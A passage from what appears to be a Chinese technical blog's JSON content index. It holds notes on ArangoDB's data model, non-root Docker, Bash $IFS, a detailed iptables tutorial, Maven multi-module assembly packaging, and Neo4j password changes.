0\n"},"articles/tech/arangodb/README":{"title":"README","links":[],"tags":["arangodb"],"content":"arangodb 是一款开源的可扩展的图形数据库系统。\n安装\n从 Download 下载，解压后执行如下命令启动数据库\narangodb start\n\n之后可通过 Web 页面 http://localhost:8529/ 进行访问，也可通过控制台访问。默认包含 _system 数据库和名为 root 用户。\n可通过如下命令重设 root 用户密码\nsudo systemctl stop arangodb3 # 关闭服务器\narango-secure-installation\n\n数据结构\narangodb 将数据分为 3 层\ndatabase-&gt;collections-&gt;documents\n\nDocuments\n其中 documents 中的数据以 json 形式进行存储，每一对 k-v 被称为 attribute，所有的 document 都包含两个默认属性，_id 和 _key，可以手动指定，若没有则会自动生成，它们都是唯一的，创建后无法修改。此外还有 _rev 属性，由系统进行维护，无需进行设定。\n下面是一个示例\n{\n  &quot;_id&quot; : &quot;myusers/3456789&quot;,\n  &quot;_key&quot; : &quot;3456789&quot;,\n  &quot;_rev&quot; : &quot;14253647&quot;,\n  &quot;firstName&quot; : &quot;John&quot;,\n  &quot;lastName&quot; : &quot;Doe&quot;,\n  &quot;address&quot; : {\n    &quot;street&quot; : &quot;Road To Nowhere 1&quot;,\n    &quot;city&quot; : &quot;Gotham&quot;\n  },\n  &quot;hobbies&quot; : [\n    { &quot;name&quot;: &quot;swimming&quot;, &quot;howFavorite&quot;: 10 },\n    { &quot;name&quot;: &quot;biking&quot;, &quot;howFavorite&quot;: 6 },\n    { &quot;name&quot;: &quot;programming&quot;, &quot;howFavorite&quot;: 4 }\n  ]\n}\n在底层，documents 数据以一种称为 VelocyPack 的 binary 格式存储。\n每个 document 都有与之关联的 key，也就是 _key 属性，它的值需要遵循如下规范：\n\n由大小写字母，阿拉伯数字，_、 -、 .、 @、 (、 )、 +、 ,、 =、 ;、 $、 !、 *、 &#039;、 % 组成。\n最大长度 256 个字节，大小写敏感。\n\n而 _id 属性表示 document 在整个 database 中的唯一性，由 collection-name/document-key 组成，例如\n{\n  &quot;_id&quot; : &quot;myusers/3456789&quot;,\n  &quot;_key&quot; : &quot;3456789&quot;,\n}\n_rev 在单机模式部署下，是唯一的，不会发生变化。它表示 document 内容是否发生改变，当 document 的内容被更新时才会发生变化。同时它可以作为一个判断依据，例如，客户端获取了一条 document，修改后写入，在写入之前可以判断 _rev 是否相同，从而保证写入的目标是正确的。而上述情景可能有其它操作在写入前就已经更改了 document 了。\nCollections\ncollections 是 documents 的集合，它包含两种类型，document collection/vertex collections（作为图的节点时） 和 edge collections，前者为默认类型。\n若是类型为 edge collections 『边』，则需要包含 _from 和 _to 属性，它们分别指向 vertex collections 中 document 的 _id。从 _from 到 _to 表示一条有向边。\ncollections 的名称需要遵循以下规范：\n\n由大小写字母，阿拉伯数字，_ 和 - 组成，用户定义的 collections 必需以字母开头，系统定义的 collections 必需以 _ 开头。\n最大长度 256 个字节，大小写敏感。\n\n当使用 --database.extended-names 参数启动 arangodb 时可支持拓展命名功能『实验性』，相比前者不同的是：\n\n支持大多数 UTF-8 能够表示的字符，例如中文，表情等，但不能包含控制字符，/ 和 :。\n首位不能包含空格或制表符。\n\n参考\n\nwww.arangodb.com/download/ 『Arangodb 下载链接』\nwww.arangodb.com/docs/stable/data-structure.html\n\nwww.arangodb.com/docs/stable/data-modeling-databases.html 『 databases 说明文档』\nwww.arangodb.com/docs/stable/data-modeling-collections.html 『collections 说明文档』\nwww.arangodb.com/docs/stable/data-modeling-documents.html 『documents 说明文档』\n\n\n"},"articles/tech/docker/普通用户运行-Docker":{"title":"普通用户运行 Docker","links":[],"tags":["docker"],"content":"配置\n创建 docker 组\nsudo groupadd docker\n添加用户至 docker 组中\nsudo usermod -aG docker $USER\n登出或重启后再次登入，使设置生效。\n参考\n\nRun the Docker daemon as a non-root user (Rootless mode) | Docker Documentation\nRun Docker as a non-root user – The Geek Diary\n"},"articles/tech/linux/bash/Bash-中的-$IFS":{"title":"Bash 中的 $IFS","links":[],"tags":["bash","ifs"],"content":"Table of Contents\n\nIFS 使用示例\n参考\n\nIFS 是 bash 的内置变量，是一个用于分割字段的字符列表『不止一个字符』，在大多数情况下，它的默认值是 &lt;space&gt;&lt;tab&gt;&lt;newline&gt;，也即  \\t\\n，不过在 zsh 下这个值是  \\t\\n\\x00，即多一个 \\x00。\necho -n &quot;$IFS&quot; | hexdump -C\n00000000  20 09 0a 00                                       | ...|\n00000004\n\n-n 参数 echo 表示输出时不要带上换行\n\nIFS 变量的作用是在 bash 中分割字符，在 man bash 中的 Word Splitting 中有介绍详细的分割逻辑。\nWord Splitting\n       The shell scans the results of parameter expansion, command substitution, and arithmetic expansion that\n       did not occur within double quotes for word splitting.\n\n       The shell treats each character of IFS as a delimiter, and splits the results of the  other  expansions\n       into  words  on  these characters.  If IFS is unset, or its value is exactly &lt;space&gt;&lt;tab&gt;&lt;newline&gt;, the\n       default, then any sequence of IFS characters serves to delimit words.  If IFS has a  value  other  than\n       the default, then sequences of the whitespace characters space and tab are ignored at the beginning and\n       end of the word, as long as the whitespace character is in the value of IFS (an IFS whitespace  charac-\n       ter).   Any character in IFS that is not IFS whitespace, along with any adjacent IFS whitespace charac-\n       ters, delimits a field.  A sequence of IFS whitespace characters is also treated as  a  delimiter.   If\n       the value of IFS is null, no word splitting occurs.\n\n       Explicit  null arguments (&quot;&quot; or &#039;&#039;) are retained.  Unquoted implicit null arguments, resulting from the\n       expansion of parameters that have no values, are removed.  If a parameter with  no  value  is  expanded\n       within double quotes, a null argument results and is retained.\n\n       Note that if no expansion occurs, no splitting is performed.\n\n从中可以看到 IFS 只在特定情况中会参与 the results of parameter expansion, command substitution, and arithmetic expansion that did not occur within double quotes，也就是未在双引号内发生的参数扩展、命令替换和算术扩展的结果才会被 IFS 指定的字符列表分割。\nIFS 使用示例\n下面看一个例子，当前目录下存在一个名为 a b c.txt 的文件。注意文件名中保护空格，那么下面这段 shell 脚步的执行会产生非预期的结果\n#!/bin/bash\n \necho &quot;1.Test with default IFS:&quot;\necho -n &quot;$IFS&quot; | hexdump -C\nfor item in `ls`\ndo\n\techo &quot;file: $item&quot;\ndone\n输出如下\n1.Test with default IFS:\n00000000  20 09 0a                                          | ..|\n00000003\nfile: a\nfile: b\nfile: c.txt\n\n可以看到 ls 都执行结果被分割了，这是因为 IFS 字符列表中包含空格，这种情况可以临时指定 IFS=&#039;\\n&#039; 来解决。\n#!/bin/bash\n \necho &quot;1.Test with default IFS:&quot;\necho -n &quot;$IFS&quot; | hexdump -C\n \nIFS_SAVE=$IFS\nIFS=$&#039;\\n&#039;\necho -n &quot;$IFS&quot; | hexdump -C\n \nfor item in `ls`\ndo\n\techo &quot;file: $item&quot;\ndone\n \nIFS=$IFS_SAVE\necho -n &quot;$IFS&quot; | hexdump -C\n输出如下\n1.Test with default IFS:\n00000000  20 09 0a                                          | ..|\n00000003\n00000000  0a                                                |.|\n00000001\nfile: a b c.txt\n00000000  20 09 0a                                          | ..|\n00000003\n\n参考\n\nIFS详解\n详细解析Shell中的IFS变量 - 知乎\n"},"articles/tech/linux/iptables/iptables-学习记录":{"title":"iptables 学习记录","links":[],"tags":["iptables"],"content":"基本概念\n首先需要明确，iptables 只是用户态下的一款命令行工具，并不是真正意义上的防火墙。实际起到防火墙作用的是内核中的模块 netfilter。iptables 只是用于操作它的工具，后面将 iptables/netfilter 简称为 iptables\n表和链\niptables 将流量的检测分为了 5 个区域（链），分别是 PREROUTING、INPUT、FORWARD、OUTPUT、POSTROUTING，每个链所能使用的表的种类是不一样的，而每个表中包含的则是具体的规则。\niptables 为我们提供了如下规则的分类，或者说，iptables 为我们提供了如下『表』\n\nfilter 表：负责过滤功能，防火墙；内核模块：iptables_filter\nnat 表：network address translation，网络地址转换功能；内核模块：iptable_nat\nmangle 表：拆解报文，做出修改，并重新封装的功能；内核模块：iptable_mangle\nraw 表：关闭 nat 表上启用的连接追踪机制；内核模块：iptable_raw\n\n上述 5 个链所能使用的表『规则类别』是不同的：\n\nPREROUTING ：raw 表，mangle 表，nat 表。\nINPUT ：mangle 表，filter 表，（centos7 中还有 nat 表，centos6 中没有）。\nFORWARD ：mangle 表，filter 表。\nOUTPUT ：raw 表， mangle 表，nat 表，filter 表。\nPOSTROUTING ：mangle 表，nat 表。\n\n下图为『朱双印』整理的对照关系，注意其中不同链所处的位置，在编写规则是需要清楚其作用范围。\n\n\n除了系统默认 5 条链，用户也可以自定义一条链，但是需要将它作为引用插入到前述 5 条链之中才能使用。\n\n规则\n规则的逻辑很简单，如果数据包符合指定的条件，则进行某个动作。最基础的匹配条件有两个，源地址和目的地址，除此之外还包含拓展匹配功能，需要有相应的内核模块才能使用，这些扩展条件其实也是 netfilter 中的一部分。例如 state，匹配 TCP 协议的状态。\n常见的规则动作有如下几种：\n\nACCEPT：允许数据包通过。\nDROP：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。\nREJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。\nSNAT：源地址转换，解决内网用户用同一个公网地址上网的问题。\nMASQUERADE：是 SNAT 的一种特殊形式，适用于动态的、临时会变的 ip 上。\nDNAT：目标地址转换。\nREDIRECT：在本机做端口映射。\nLOG：在 /var/log/messages 文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。\n\n基本操作\n规则都是存在于表中，类比数据库中的表，它的相关操作也是类似的，有增删改查。\n规则的查找\n查找是最简单的，可通过如下命令查看 filter 表中的规则，参数 -t 表示查看的表类型，-L 表示列出规则\niptables -t filter -L\n输出结果如下『内容较长，只截取了一部分』，红色方块包含的为规则的内容，蓝色方块包含的为对应的链，图中展示了两个链，INPUT 和 FORWARD。\n\n假设希望放通其它机器对本机的特定端口的访问，那么可以在 filter 表中定义规则，并放入 INPUT 链上。\n此外，举一反三，若是想查看其它表的规则，可使用如下命令\niptables -t raw -L\niptables -t mangle -L\niptables -t nat -L\n如果省略 -t 参数，默认操作 filter 表。所以可以也可以直接使用\niptables -L\n若是想查看特定链上的规则信息，使用如下命令，其中若不指定 -t 参数则默认读取 filter 中的规则\niptables -L INPUT -t filter\n\n图中自由 5 列，而使用 -v 参数可以看到更详细的信息\niptables -vL INPUT\n\n各个字段的含义如下：\n\npkts: 对应规则匹配到的报文的个数。\nbytes: 对应匹配到的报文包的大小总和。\ntarget: 规则对应的 target，往往表示规则对应的『动作』，即规则匹配成功后需要采取的措施。\nprot: 表示规则对应的协议，是否只针对某些协议应用此规则。\nopt: 表示规则对应的选项。\nin: 表示数据包由哪个接口 (网卡) 流入，即从哪个网卡来。\nout: 表示数据包将由哪个接口 (网卡) 流出，即到哪个网卡去。\nsource: 表示规则对应的源头地址，可以是一个 IP，也可以是一个网段。\ndestination: 表示规则对应的目标地址。可以是一个 IP，也可以是一个网段。\n\nsource 和 destination 在规则中是设置成 ip 形式的，而前面的执行结果中展示的都是 anywhere，它对应 0.0.0.0/0 表示所有地址，这是因为 iptables 对 ip 做了 DNS 反向查询以寻找对应的 hostname 或域名。\n可以使用 -n 选项，表示不对 IP 地址进行名称反向查询，直接显示 IP 地址\niptables -nvL INPUT\n\n若是想显示每条规则的编号，则可以使用 –line-numbers 选项\niptables --line-numbers -nvL INPUT\n\n输出的规则信息中除了展示的每一列的字段，在每个链的后面都有一个括号，括号里面有一些信息\nChain INPUT (policy ACCEPT 0 packets, 0 bytes)\n\npolicy 表示当前链的默认策略，policy ACCEPT 表示 INPUT 的链中的规则的默认动作为 ACCEPT，即默认放通所有经过 INPUT 的流量，所以我们在配置 INPUT 链的具体规则时，若要拒绝则需要显示指定动作『DROP 或者 REJECT』。\n但如果是这样，那么意味着在 INPUT 链配置的每个规则的动作应当是 DROP 或者 REJECT，也就是黑名单的形式。不过实际情况似乎并非如此，上图可以看到很多动作为 ACCEPT 的规则，看着更像是白名单，这一点和 iptables 的机制有关，后续会提到。\npackets 表示当前链（上例为 INPUT 链）默认策略匹配到的包的数量，0 packets 表示默认策略匹配到 0 个包。bytes 表示当前链默认策略匹配到的所有包的大小总和。它们被称为计数器，使用 -v 选项时才会显示。\n规则的新增\n\n在开始之前，在测试机器上先清空 INPUT 上的 filter 表中规则，使用 iptables -F INPUT，-F 表示 flush 擦除所选范围中的所有规则。\n\n假设要屏蔽 10.128.154.152 对本机的所有请求，那么匹配逻辑里只要匹配源地址即可。动作可以选择 DROP 或 REJECT。\n可用如下命令在 INPUT 链的 filter 表中的新增一条规则，-I 表示插入，-s 表示指定规则的匹配条件中的源地址，-j 表示当条件满足时执行的动作，这里为 DROP。\niptables -t filter -I INPUT -s 10.128.154.152 -j DROP\n设置之后，查看当前规则列表\niptables -nvL INPUT\n结果如下。\n\n此时若尝试从 10.128.154.152 对本机执行 ping 操作，会发现 ping 不通，说明规则生效了。如果在 INPUT 链中的 filter 表里再新增一条规则，放通来自 10.128.154.152 的流量会怎么样？\n使用如下命令新增一条规则，-A 表示追加模式，会在 filter 表的末尾新增一条规则；与 -I 不同的是，前者是在首部新增一条规则。\niptables -A INPUT -s 10.128.154.152 -j ACCEPT\n再次尝试 ping 操作，依然 ping 不通。那现在尝试在首部新增一条放通规则\niptables -I INPUT -s 10.128.154.152 -j ACCEPT\n规则内容如下\nChain INPUT (policy ACCEPT 4760K packets, 3443M bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 ACCEPT     all  --  *      *       10.128.154.152            0.0.0.0/0\n    2   168 DROP       all  --  *      *       10.128.154.152            0.0.0.0/0\n    0     0 ACCEPT     all  --  *      *       10.128.154.152            0.0.0.0/0\n再一次尝试 ping 操作，可以 ping 通了。\n这说明，规则的顺序很重要！规则是按顺序依次匹配的，前面的命中了就不会再匹配后面的规则了。\n那边规则的顺序是怎样的呢？还记得 --line-numbers 参数吗，使用该参数查看规则编号如下\n\n编号即它们的匹配顺序，你肯定会想能不能把规则插入在指定的编号后，毕竟这样会方便许多。可以在 -I 参数后增加一个数字，表示要插入至对应数字对应的编号中。\n下面的命令会将规则放置在 num = 2 的位置\niptables -I INPUT 2 -s 10.128.154.152 -j ACCEPT\n结果如下\n\n规则的删除\n删除规则首先需要知道要删除的规则是什么，有两种方式，一种是指定规则的编号，另一种是指定规则的匹配条件与动作，以此来筛选要删除的目标。\n首先来看第一种方法，使用 --line-numbers 『--line 简写』参数查看规则编号\niptables --line -nvL INPUT\n\n假定要删除编号为 2 的规则\niptables -t filter -D INPUT 2\n执行后再次查看当前规则，效果如下\n\n第二种方式则是指定规则的匹配条件，执行如下命令，删除源地址为 10.128.154.152，动作为 ACCEPT 的规则\niptables -t filter -D INPUT -s 10.128.154.152 -j ACCEPT\n但是查看删除后的规则内容会发现，它只删除了其中一条，这是因为 -D 选项一次只会删除一条规则，若想删除另一条需要再执行一次。\n\n而删除某条链中指定表中的所有规则的命令如下，前面已经使用过了，\niptables -t 表名 -F 链名\n-F 选项为 flush 之意，即冲刷指定的链删除指定链中的所有规则，但是注意在没有保存 iptables 规则的情况下，请慎用。\n-F 选项不仅仅能清空指定链上的规则，还能清空整个表中在所有链上的规则，不指定链名，只指定表名即可删除表中的所有规则，命令如下\niptables -t 表名\n类似的，若删除链上的所有规则，则使用\niptables -F 链名\n\n规则的修改\n规则的修改有一定的限制，通常来讲只能修改已有规则的动作，若想修改规则的匹配条件，最好的方式是删除已有规则再新增一条。\n假设要修改规则的动作，可以使用如下命令，其中 -R 选项指定要修改的链，并指定规则对应的编号『有坑』\niptables -t filter -R INPUT 1 -s 10.128.154.152 -j ACCEPT\n修改后的内容如下\n\n需要注意，-s 参数不能省略，或者说你需要指定规则的所有匹配逻辑，才能对规则进行修改。即使已经指定了规则对应的编号，但是在使用 -R 选项修改某个规则时，必须指定规则原本的匹配条件。\n如果不指定会发生什么？执行如下命令\niptables -t filter -R INPUT 1 -j ACCEPT\n会发现 source 直接变成了 0.0.0.0/0，这是非常危险的。\n\n更糟糕的一种情况似乎，你如果执行了\niptables -t filter -R INPUT 1 -j REJECT\n就意味这拒绝了所有的入站数据包，如果此刻你在使用 ssh 连接主机则会立即断开，对于云主机而言，这是非常糟糕的事情。\n所以务必不要这么做。\n\n这里说明一下 DROP 和 REJECT 的具体区别，DROP 和 REJECT 造成的结果都有禁止访问和拒绝的意思，但相比之下，REJECT 显得更加礼貌和干脆，如同你直接拒绝你的追求者，相比吊着人家不给予任何回应要好的多。REJECT 会告知对方，本机拒绝了你的访问请求，而 DROP 则不会有任何回应。\n\n修改指定链中指定表的默认策略方式如下\niptables -t filter -P FORWARD ACCEPT\n上面的命令修改 FORWAR 链的 filter 表的默认策略为 ACCEPT，表示允许转发，默认是不允许的。\n规则的保存与恢复\n默认情况下通过 iptables 进行的修改都是临时的，但机器重启后又会恢复到最初的状态。\n那么规则如何持久化？最通用的方法是使用 iptables-save 命令。通过该命令配合重定向，将配置写入指定的文件中『文件的位置可以任意指定，但 ubuntu 通常将规则存放在 /etc/iptables 中』。\niptables-save &gt; /etc/iptables/rules.v4\n若是想从保存的文件中恢复规则，则可以使用 iptables-restore 命令\niptables-restore &lt; /etc/iptables/rules.v4\n规则匹配逻辑\niptables 支持的匹配逻辑远不止源地址这一项。在前面的内容中，只使用了 -s 选项指定了源地址，但该参数还可以指定 CIDR 形式的地址段，例如 0.0.0.0/0，这也是它的默认值。\n源目 IP\n如果想同时指定多个 IP，可用逗号分隔\niptables -I INPUT -s 10.128.154.152,10.128.154.153 -j ACCEPT\n此外还可以使用 ! 来对条件取非，例如\niptables -I INPUT -s !10.128.154.152 -j ACCEPT\n\n需要注意，使用取非操作时，不可同时指定多个条件，即不能指定多个 IP。\n\n上面的命令表示，如果源 IP 不是 10.128.154.152 就放行。但是需要注意，这并不代表如果源 IP 是 10.128.154.152 就拒绝，这是两码事。因为当源 IP 为 10.128.154.152 时，与 !10.128.154.152 匹配的结果是 false，不会执行后面的动作。而是继续匹配下一条规则，若后续没有其它规则，INPUT 链的默认动作是 ACCEPT，那么流量就会被放行。\n所以，若是要拒绝某个 IP（段）的流量，使用类似下面的写法\niptables -I INPUT -s 10.128.154.152 -j DROP/REJECT\n除了匹配源 IP，还可以通过选项 -d 匹配目的 IP\niptables -I INPUT -d 10.128.154.152 -j ACCEPT\n协议类型\n可以使用 -p 选项，指定需要匹配的报文的协议类型。例如拒绝来自 10.128.154.152 的 TCP 协议的流量。\niptables -I INPUT -s 10.128.154.152 -p tcp -j DROP\n-p 选项支持的协议有 tcp, udp, udplite, icmp, icmpv6,esp, ah, sctp, mh『非全部，版本不同可能会有差异』，如果不显示指定 -p 参数，则表示匹配所有协议，效果和 -p all 相同。\n网卡接口\n若是有多个网卡，但只希望规则对指定网卡生效，可以使用 -i 参数指定流量来自哪个网卡\niptables -I INPUT -i eth0 -s 10.128.154.152 -p tcp -j DROP\n上面的规则指定只丢弃从网卡 eth0 流入的数据包。\n既然能指定入口网卡，那么也能指定出口网卡，与 -i 对应的选项是 -o ，用于限定规则的作用范围只针对特定网卡的流出流量生效。\n-i 选项添加的规则只能作用于 PREROUTING 链、INPUT 链、FORWARD 链。\n-o 选项添加的规则只能作用于 FORWARD 链、OUTPUT 链、POSTROUTING 链。\n拓展匹配逻辑\n拓展匹配逻辑需要使用附加的内核模块，例如匹配 tcp 协议中的端口号，使用的是 tcp 扩展模块中的 dport 扩展匹配条件。若想使用拓展匹配条件，需要指定要使用的拓展模块，\niptables -I INPUT -m tcp -p tcp --dport 22 -j ACCEPT\n例如上面的规则会放行对 22 端口的访问，从而允许使用 ssh 功能。-m 选项用于指定要使用的拓展模块，但是在某些情况下你可以省略它。如果没有指定 -m 选项，则默认会从 -p 选项中指定的参数来查找要使用的模块，-p 选项的参数也是 tcp，所以可以省略掉 -m 选项。\niptables -I INPUT -p tcp --dport 22 -j ACCEPT\n而若是想匹配源端口，则使用 --sport 选项。\n扩展匹配条件也是可以取非的，比如 ! –dport 22，表示目标端口不是 22 的报文将会被匹配到。而不管是 –sport 还是 –dsport，都能够指定一个端口范围，比如，–dport 22:25 表示目标端口为 22 到 25 之间的所有端口。\niptables -I INPUT -p tcp --dport 22:25 -j ACCEPT\n也可以使用简写方式，--dport :22 表示匹配 0 到 22 的所有端口，--dport 22: 表示匹配 22 到 65535 的所有端口。\n端口和源目 IP 一样可以使用用逗号分隔，指定离散的端口号，但需要使用 -m multiport 参数并配合 --dports 选项，因为这个功能需要用到 multiport 扩展模块\niptables -I INPUT -m multiport -p tcp --dports 22,443 -j ACCEPT\n参考\n\nwww.zsythink.net/archives/tag/iptables/ 『朱双印的 iptables 详解系列文章』\n"},"articles/tech/maven/maven-assembly-plugin-模块打包":{"title":"maven-assembly-plugin 模块打包","links":[],"tags":["maven","package"],"content":"单模块\n对于单个模块的情况，如果想将项目静态（带依赖）打包为一个完整的 jar 包，那么可以使用直接使用 maven-assembly-plugin 预定义的 jar-with-dependencies 配置进行打包。\n&lt;assembly xmlns=&quot;maven.apache.org/ASSEMBLY/2.1.1&quot;\n  xmlns:xsi=&quot;www.w3.org/2001/XMLSchema-instance&quot;\n  xsi:schemaLocation=&quot;maven.apache.org/ASSEMBLY/2.1.1 maven.apache.org/xsd/assembly-2.1.1.xsd&quot;&gt;\n  &lt;!-- TODO: a jarjar format would be better --&gt;\n  &lt;id&gt;jar-with-dependencies&lt;/id&gt;\n  &lt;formats&gt;\n    &lt;format&gt;jar&lt;/format&gt;\n  &lt;/formats&gt;\n  &lt;includeBaseDirectory&gt;false&lt;/includeBaseDirectory&gt;\n  &lt;dependencySets&gt;\n    &lt;dependencySet&gt;\n      &lt;outputDirectory&gt;/&lt;/outputDirectory&gt;\n      &lt;useProjectArtifact&gt;true&lt;/useProjectArtifact&gt;\n      &lt;unpack&gt;true&lt;/unpack&gt;\n      &lt;scope&gt;runtime&lt;/scope&gt;\n    &lt;/dependencySet&gt;\n  &lt;/dependencySets&gt;\n&lt;/assembly&gt;\n在项目的 pom.xml 中添加如下构建配置\n&lt;build&gt;\n    &lt;plugins&gt;\n      &lt;plugin&gt;\n        &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;\n        &lt;executions&gt;\n          &lt;execution&gt;\n            &lt;phase&gt;package&lt;/phase&gt;\n            &lt;goals&gt;\n              &lt;goal&gt;single&lt;/goal&gt;\n            &lt;/goals&gt;\n          &lt;/execution&gt;\n        &lt;/executions&gt;\n        &lt;configuration&gt;\n          &lt;descriptorRefs&gt;\n            &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;\n          &lt;/descriptorRefs&gt;\n          &lt;archive&gt;\n            &lt;manifest&gt;\n                &lt;mainClass&gt;com.github.trganda.App&lt;/mainClass&gt;\n            &lt;/manifest&gt;\n          &lt;/archive&gt;\n        &lt;/configuration&gt;\n      &lt;/plugin&gt;\n    &lt;/plugins&gt;\n&lt;/build&gt;\n并执行以下命令即可\nmvn package\n多模块\n如果是类似的需求，将一个多模块的项目的所有子项目及其依赖都打包进一个 jar 包中应该如何做。这里以 RuoYi v4.7.6 为例，它的项目结构如下，\n&gt; tree ./ -L 1\n./\n├── LICENSE\n├── README.md\n├── bin\n├── doc\n├── pom.xml\n├── ruoyi-admin\n├── ruoyi-common\n├── ruoyi-distribution\n├── ruoyi-framework\n├── ruoyi-generator\n├── ruoyi-quartz\n├── ruoyi-system\n├── ry.bat\n├── ry.sh\n└── sql\nparent 中不包含代码逻辑，仅用于包含子模块\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;project xmlns=&quot;maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;www.w3.org/2001/XMLSchema-instance&quot;\n      xsi:schemaLocation=&quot;maven.apache.org/POM/4.0.0 maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\n  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n \n  &lt;groupId&gt;com.ruoyi&lt;/groupId&gt;\n  &lt;artifactId&gt;ruoyi&lt;/artifactId&gt;\n  &lt;version&gt;4.7.6&lt;/version&gt;\n \n  &lt;name&gt;ruoyi&lt;/name&gt;\n  &lt;url&gt;www.ruoyi.vip&lt;/url&gt;\n  &lt;description&gt;若依管理系统&lt;/description&gt;\n \n\t&lt;!-- ... --&gt;\n \n  &lt;modules&gt;\n    &lt;module&gt;ruoyi-admin&lt;/module&gt;\n    &lt;module&gt;ruoyi-framework&lt;/module&gt;\n    &lt;module&gt;ruoyi-system&lt;/module&gt;\n    &lt;module&gt;ruoyi-quartz&lt;/module&gt;\n    &lt;module&gt;ruoyi-generator&lt;/module&gt;\n    &lt;module&gt;ruoyi-common&lt;/module&gt;\n    &lt;module&gt;ruoyi-distribution&lt;/module&gt;\n  &lt;/modules&gt;\n  &lt;packaging&gt;pom&lt;/packaging&gt;\n \n\t&lt;!-- ... --&gt;\n&lt;/project&gt;\n根据官方文档[1]，过程完全没有网上搜到的教程中描述的那么麻烦，具体步骤如下：\nParent 的 pom.xml\n添加如下配置\n&lt;plugin&gt;\n  &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;\n  &lt;version&gt;3.5.0&lt;/version&gt;\n&lt;/plugin&gt;\n新增子项目\n创建一个新的子项目，名称随意，如 ruoyi-distribution，pom.xml 文件内容如下\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;project xmlns=&quot;maven.apache.org/POM/4.0.0&quot;\n         xmlns:xsi=&quot;www.w3.org/2001/XMLSchema-instance&quot;\n         xsi:schemaLocation=&quot;maven.apache.org/POM/4.0.0 maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n    &lt;parent&gt;\n        &lt;groupId&gt;com.ruoyi&lt;/groupId&gt;\n        &lt;artifactId&gt;ruoyi&lt;/artifactId&gt;\n        &lt;version&gt;4.7.6&lt;/version&gt;\n    &lt;/parent&gt;\n \n    &lt;artifactId&gt;ruoyi-distribution&lt;/artifactId&gt;\n \n    &lt;!-- NOTE: 不需要添加所有其它的子模块，只需包含一个即可，它的目的是告诉 assembly 这个模块构建后，assembly 就可以开始进行打包工作了。\n    --&gt;\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;com.ruoyi&lt;/groupId&gt;\n            &lt;artifactId&gt;ruoyi-common&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n \n    &lt;build&gt;\n        &lt;plugins&gt;\n            &lt;plugin&gt;\n                &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;\n                &lt;executions&gt;\n                    &lt;execution&gt;\n                        &lt;phase&gt;package&lt;/phase&gt;\n                        &lt;goals&gt;\n                            &lt;goal&gt;single&lt;/goal&gt;\n                        &lt;/goals&gt;\n                        &lt;configuration&gt;\n                            &lt;descriptors&gt;\n                                &lt;descriptor&gt;assembly/distribution.xml&lt;/descriptor&gt;\n                            &lt;/descriptors&gt;\n                        &lt;/configuration&gt;\n                    &lt;/execution&gt;\n                &lt;/executions&gt;\n            &lt;/plugin&gt;\n        &lt;/plugins&gt;\n    &lt;/build&gt;\n&lt;/project&gt;\n在该模块下的新增 assembly/distribution.xml 文件\n&lt;assembly xmlns=&quot;maven.apache.org/ASSEMBLY/2.1.1&quot;\n          xmlns:xsi=&quot;www.w3.org/2001/XMLSchema-instance&quot;\n          xsi:schemaLocation=&quot;maven.apache.org/ASSEMBLY/2.1.1 maven.apache.org/xsd/assembly-2.1.1.xsd&quot;&gt;\n    &lt;id&gt;all&lt;/id&gt;\n    &lt;formats&gt;\n        &lt;format&gt;jar&lt;/format&gt;\n    &lt;/formats&gt;\n    &lt;includeBaseDirectory&gt;false&lt;/includeBaseDirectory&gt;\n    &lt;moduleSets&gt;\n        &lt;moduleSet&gt;\n \n            &lt;!-- Enable access to all projects in the current multimodule build! --&gt;\n            &lt;useAllReactorProjects&gt;true&lt;/useAllReactorProjects&gt;\n \n            &lt;!-- Now, select which projects to include in this module-set. --&gt;\n            &lt;includes&gt;\n                &lt;include&gt;com.ruoyi:ruoyi-admin&lt;/include&gt;\n                &lt;include&gt;com.ruoyi:ruoyi-framework&lt;/include&gt;\n                &lt;include&gt;com.ruoyi:ruoyi-system&lt;/include&gt;\n                &lt;include&gt;com.ruoyi:ruoyi-quartz&lt;/include&gt;\n                &lt;include&gt;com.ruoyi:ruoyi-generator&lt;/include&gt;\n                &lt;include&gt;com.ruoyi:ruoyi-common&lt;/include&gt;\n            &lt;/includes&gt;\n            &lt;binaries&gt;\n                &lt;outputDirectory&gt;libs/&lt;/outputDirectory&gt;\n                &lt;unpack&gt;false&lt;/unpack&gt;\n            &lt;/binaries&gt;\n        &lt;/moduleSet&gt;\n    &lt;/moduleSets&gt;\n&lt;/assembly&gt;\n最后执行以下命令\nmvn package\n即可在 ruoyi-distribution 的 target 目录下得到完整的 jar 包，ruoyi-distribution-4.7.6-all.jar。\n参考\n\nmaven.apache.org/plugins/maven-assembly-plugin/examples/multimodule/module-binary-inclusion-simple.html\n"},"articles/tech/neo4j/Neo4j-密码修改":{"title":"Neo4j 密码修改","links":["til/installation/Neo4j-安装"],"tags":[],"content":"初始密码\nNeo4j 的默认账号和密码为 neo4j/neo4j，若是通过 Neo4j Desktop 创建的数据库，则在创建时会要求你设置密码。\n设置完成后，参考 Neo4j 安装 中的方式，从浏览器或 Neo4j Browser 中登陆数据库。\n修改密码\n若是通过 Web 端访问，输入语句 :server change-password，按照提示进行操作即可。\n若是控制台访问，进入数据库的安装目录下的 bin 目录，执行 cypher-shell 文件\n./cypher-shell\n之后输入\nCALL dbms.security.changePassword(&#039;neo4j&#039;);\n:exit;\n保存后退出，并重启数据库。\n重置密码\n第一种方式是使用上述的 cypher-shell 